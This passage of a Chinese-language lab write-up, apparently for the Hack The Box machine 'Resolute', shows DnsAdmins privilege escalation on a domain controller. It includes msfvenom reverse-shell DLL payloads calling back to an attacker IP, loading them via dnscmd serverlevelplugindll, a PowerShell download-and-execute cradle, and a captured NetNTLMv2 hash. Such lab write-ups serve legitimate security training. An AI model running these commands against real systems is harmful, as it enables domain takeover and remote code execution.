<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net localgroup &quot;Remote Management Users&quot;<br><span class="hljs-keyword">Alias</span> <span class="hljs-type">name</span>     Remote Management Users<br><span class="hljs-keyword">Comment</span>        Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can <span class="hljs-keyword">access</span> WMI resources <span class="hljs-keyword">over</span> management protocols (such <span class="hljs-keyword">as</span> WS-Management via the Windows Remote Management service). This applies <span class="hljs-keyword">only</span> <span class="hljs-keyword">to</span> WMI namespaces that <span class="hljs-keyword">grant</span> <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> the <span class="hljs-keyword">user</span>.<br><br>Members<br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>Contractors<br>melanie<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>哦，ryan在Contractors里，而Contractors在远程管理组中，所以我才能远程登录。不过并不重要。我可以看一眼ryan用户详细组：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; whoami /groups<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span><br>-----------------<br><br><span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                                 <span class="hljs-keyword">Type</span>             SID                                            <span class="hljs-keyword">Attributes</span><br>========================================== ================ ============================================== ===============================================================<br>Everyone                                   Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>                                        Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Users                              Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Pre-Windows <span class="hljs-number">2000</span> Compatible Access Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Remote Management Users            Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\NETWORK                       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-2</span>                                        Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\Authenticated Users           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>                                       Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\This Organization             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>                                       Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">MEGABANK</span>\Contractors                       <span class="hljs-keyword">Group</span>            <span class="hljs-title">S-1-5-21-1392959593-3013219662-3596683436-1103</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">MEGABANK</span>\DnsAdmins                         Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1392959593</span>-<span class="hljs-number">3013219662</span>-<span class="hljs-number">3596683436</span>-<span class="hljs-number">1101</span> Mandatory group, Enabled by default, Enabled group, Local <span class="hljs-keyword">Group</span><br><span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>                                    Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level     Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>ryan在DnsAdmins 组里，这个组看着像权限挺大的。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">Microsoft 文档</a>将此 DnsAdmins 描述为：DNSAdmins 组的成员可以访问网络 DNS 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。</p>
<p>在谷歌中不断搜索。我发现了这篇文章：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>lolbas-project.github.io<span class="hljs-regexp">/lolbas/</span>Binaries<span class="hljs-regexp">/Dnscmd/</span><br></code></pre></td></tr></table></figure>

<p>我可以截一些关键的信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png" srcset="/img/loading.gif" lazyload alt="image-20220423202545223"  />

<p>在本目标中，DNS服务就位于域控上，如果我将包含载荷的DLL注入到DNS服务器进程中，那么回连的会话便会是域控的会话，如果我能将DLL注入到系统进程中，那么回连的会话也是系统级别的。关于DLL注入，在我博客的C语言学习笔记中有提到过一些细节，这里我就不写了。</p>
<p>至于dnscmd，很简单，我只需要运行一下 -h 确定当前目标有没有即可，回显信息有很多，我只列一些，它位于system下，通常该目录下的exe都具有系统环境变量：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd -h<br><br>Usage: DnsCmd &lt;ServerName&gt; &lt;Command&gt; [&lt;Command Parameters&gt;]<br>&lt;ServerName&gt;:<br> <span class="hljs-built_in"> IP address </span><span class="hljs-keyword">or</span> host name    -- remote <span class="hljs-keyword">or</span> local<span class="hljs-built_in"> DNS server</span><br><span class="hljs-built_in"></span>  .                          --<span class="hljs-built_in"> DNS server </span>on local machine<br>&lt;Command&gt;:<br>  /<span class="hljs-built_in">Info</span>                      -- <span class="hljs-built_in">Get</span><span class="hljs-built_in"> server </span>information<br>  <span class="hljs-built_in">/Config </span>                   -- Reset<span class="hljs-built_in"> server </span><span class="hljs-keyword">or</span> zone configuration<br>  /EnumZones                 -- Enumerate zones<br>  /Statistics                -- Query/clear<span class="hljs-built_in"> server </span>statistics data<br><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br></code></pre></td></tr></table></figure>

<p>首先我可以生成dll载荷，目标操作系统版本在前边crackmapexec已经为我枚举出来了，windows 2016 x64：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.16.7 <span class="hljs-attribute">LPORT</span>=1337 -f dll -o whoami.dll<br>[-] <span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<br>[-] <span class="hljs-literal">No</span> arch selected, selecting arch: x64 <span class="hljs-keyword">from</span> the payload<br><span class="hljs-literal">No</span> encoder specified, outputting<span class="hljs-built_in"> raw </span>payload<br>Payload size: 510 bytes<br>Final size of dll file: 8704 bytes<br>Saved as: whoami.dll<br></code></pre></td></tr></table></figure>

<p>我还是选择meterpreter会话，或许可能需要其他一些功能，meterpreter方便很多：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf-pro &gt; use exploit/multi/handler <br>[*] Using configured payload generic/shell_reverse_tcp<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <br>payload =&gt; windows/x64/shell_reverse_tcp<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 1337<br>lport =&gt; 1337<br>msf-pro exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 10.10.16.7<br>LHOST =&gt; 10.10.16.7<br>msf-pro exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.7:1337 <br></code></pre></td></tr></table></figure>

<p>接下来我需要将dll传入到目标机器中，我可以开个smb共享让其加载我的dll或许会方便很多：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ .<span class="hljs-regexp">/toolbox/im</span>packet-<span class="hljs-number">0.9</span>.<span class="hljs-number">24</span><span class="hljs-regexp">/examples/</span>smbserver.py hack .<br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>[*] Config <span class="hljs-keyword">file</span> parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8-<span class="hljs-number">1670</span>-<span class="hljs-number">01</span>D3-<span class="hljs-number">1278</span>-<span class="hljs-number">5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span><br>[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-<span class="hljs-number">46</span>C3F87E345A V:<span class="hljs-number">1.0</span><br>[*] Config <span class="hljs-keyword">file</span> parsed<br>[*] Config <span class="hljs-keyword">file</span> parsed<br>[*] Config <span class="hljs-keyword">file</span> parsed<br></code></pre></td></tr></table></figure>

<p>我可以照着它dnscmd示例，编写如下命令：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\ryan\desktop&gt;</span> dnscmd.exe /config /serverlevelplugindll <span class="hljs-string">\\10.10.16.7\whoami.dll</span><br><br>Registry property serverlevelplugindll successfully reset.<br>Command completed successfully.<br><br>*Evil-WinRM* PS C:<span class="hljs-string">\Users\ryan\desktop&gt;</span><br></code></pre></td></tr></table></figure>

<p>没回连，不要紧，或许我需要重新启动DNS服务，</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd.exe /config /serverlevelplugindll \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.7</span>\whoami.dll<br><br>Registry property serverlevelplugindll successfully <span class="hljs-keyword">reset</span>.<br>Command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; sc.exe \\resolute stop dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">3</span>  STOP_PENDING<br>                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x1</span><br>        WAIT_HINT          : <span class="hljs-number">0x7530</span><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; sc.exe \\resolute <span class="hljs-keyword">start</span> dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">2</span>  START_PENDING<br>                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x0</span><br>        WAIT_HINT          : <span class="hljs-number">0x7d0</span><br>        PID                : <span class="hljs-number">2624</span><br>        FLAGS              :<br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt;<br></code></pre></td></tr></table></figure>

<p>可它还是没回连：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423205651911.png" srcset="/img/loading.gif" lazyload alt="image-20220423205651911"  />

<p>共享也访问成功了，端口IP也对，载荷也对，命令也成功，我的经验告诉我问题不应该出现在这里，或许我遗漏了什么，在我往前翻记录时，我忽然想起，好像有个笔记告诉我说系统变更会在一分钟内自动恢复。或许我需要动作快：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dnscmd<span class="hljs-selector-class">.exe</span> /config /serverlevelplugindll \\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.7</span>\s\whoami<span class="hljs-selector-class">.dll</span><br>sc<span class="hljs-selector-class">.exe</span> \\resolute stop dns<br>sc<span class="hljs-selector-class">.exe</span> \\resolute start dns<br></code></pre></td></tr></table></figure>

<p>wget：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; wget http:<span class="hljs-string">//10.10.16.7/whoami.dll</span> -O whoami.dll<br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <span class="hljs-keyword">ls</span><br><br><br>    Directory: C:\Users\ryan\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>-ar<span class="hljs-params">---</span>        12/3/2019   7<span class="hljs-function">:34</span> AM            155 note.txt<br>-a<span class="hljs-params">----</span>        4/23/2022   6<span class="hljs-function">:15</span> AM           8704 whoami.dll<br><br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ python -m http.server <span class="hljs-number">80</span>             <br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.10.169</span> - - <span class="hljs-string">[23/Apr/2022 21:08:33]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /whoami.dll HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure>

<p>好吧，wget也会被删除：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <span class="hljs-keyword">ls</span><br><br><br>    Directory: C:\Users\ryan\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>-ar<span class="hljs-params">---</span>        12/3/2019   7<span class="hljs-function">:34</span> AM            155 note.txt<br><br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>这是一场时间的考验，看起来我需要摸索等它下一次恢复时，快速的将dll注入进去，那我的命令需要改一下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">wget http:<span class="hljs-comment">//10.10.16.7/whoami.dll -O whoami.dll</span><br>dnscmd<span class="hljs-selector-class">.exe</span> /config /serverlevelplugindll .\whoami<span class="hljs-selector-class">.dll</span><br>sc<span class="hljs-selector-class">.exe</span> \\resolute stop dns<br>sc<span class="hljs-selector-class">.exe</span> \\resolute start dns<br></code></pre></td></tr></table></figure>

<p>可以看一下它的时间：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net <span class="hljs-built_in">time</span><br>Current <span class="hljs-built_in">time</span> <span class="hljs-keyword">at</span> \\Resolute.megabank.<span class="hljs-keyword">local</span> <span class="hljs-keyword">is</span> <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">19</span>:<span class="hljs-number">03</span> AM                                                 <br>                                                                                                                  <br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure>

<p>等它到下一次整分的时候再忙活，好吧它也不是整分的规律，或许是半分，管道符也不适用，或许我可以借助一些自动化工具，它是基于将DLL注入到系统服务之中，这种攻击方式在Metsploit中有对应的模块，但是当我准备通过powershell回连会话的时候，我看到了提示信息中的一条：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.7/shell.ps1&#x27;))&quot;<br>powershell.exe : IEX : At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>    + CategoryInfo          : NotSpecified: (IEX : At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span>:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>+ <span class="hljs-keyword">function</span> uAG0x &#123;<br>+ ~~~~~~~~~~~~~~~~<br>This script contains malicious content <span class="hljs-keyword">and</span> has been blocked <span class="hljs-keyword">by</span> your antivirus software.<br>At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ IEX ((<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.16.7/she ...</span><br><span class="hljs-string">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException</span><br><span class="hljs-string">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.Invok </span><br><span class="hljs-string">   eExpressionCommand</span><br><span class="hljs-string"> </span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>This script contains malicious content and has been blocked by your antivirus software.</strong></p>
<p><strong>此脚本包含恶意内容，已被杀毒软件阻止。</strong> </p>
<p>我大概知道了为什么没有回连了，或许我应该重置一下目标环境。那么再来一次，生成载荷：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.16.7 <span class="hljs-attribute">LPORT</span>=443 -f dll -o whoami.dll<br></code></pre></td></tr></table></figure>

<p>在当前目录启动smb匿名共享：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ./smbserver<span class="hljs-selector-class">.py</span> s .<br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8-<span class="hljs-number">1670</span>-<span class="hljs-number">01</span>D3-<span class="hljs-number">1278</span>-<span class="hljs-number">5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span><br><span class="hljs-selector-attr">[*]</span> Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-<span class="hljs-number">46</span>C3F87E345A V:<span class="hljs-number">1.0</span><br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Incoming connection (<span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span>,<span class="hljs-number">49882</span>)<br><span class="hljs-selector-attr">[*]</span> AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)<br><span class="hljs-selector-attr">[*]</span> User RESOLUTE\RESOLUTE$ authenticated successfully<br><span class="hljs-selector-attr">[*]</span> RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:<span class="hljs-number">21</span>b823d5b1d20b282614012d7e93de6f:<span class="hljs-number">010100000000000000</span>c3f99b1b57d801dc0992e0706ee955000000000100100056006700730061004b005800410079000300100056006700730061004b00580041007900020010004d004600470058004d006c0076006800040010004d004600470058004d006c00760068000700080000c3f99b1b57d8010600040002000000080030003000000000000000000000000040000059bd883320297b2e2588ab272c806f552b1114d4c485915f802e15a1c1bb07b60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000<br><span class="hljs-selector-attr">[*]</span> Disconnecting <span class="hljs-built_in">Share</span>(<span class="hljs-number">1</span>:IPC$)<br><span class="hljs-selector-attr">[*]</span> Disconnecting <span class="hljs-built_in">Share</span>(<span class="hljs-number">2</span>:S)<br><span class="hljs-selector-attr">[*]</span> Closing down connection (<span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span>,<span class="hljs-number">49882</span>)<br><span class="hljs-selector-attr">[*]</span> Remaining connections <span class="hljs-selector-attr">[]</span><br></code></pre></td></tr></table></figure>

<p>命令执行一气呵成：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd.exe /config /serverlevelplugindll \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.7</span>\s\whoami.dll<br><br>Registry property serverlevelplugindll successfully <span class="hljs-keyword">reset</span>.<br>Command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute stop dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">3</span>  STOP_PENDING<br>                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x0</span><br>        WAIT_HINT          : <span class="hljs-number">0x0</span><br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute <span class="hljs-keyword">start</span> dns<br><br>SERVICE_NAME: dns<br>        <span class="hljs-keyword">TYPE</span>               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        STATE              : <span class="hljs-number">2</span>  START_PENDING<br>                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)<br>        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0x0</span>)<br>        <span class="hljs-keyword">CHECKPOINT</span>         : <span class="hljs-number">0x0</span><br>        WAIT_HINT          : <span class="hljs-number">0x7d0</span><br>        PID                : <span class="hljs-number">140</span><br>        FLAGS              :<br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <br></code></pre></td></tr></table></figure>

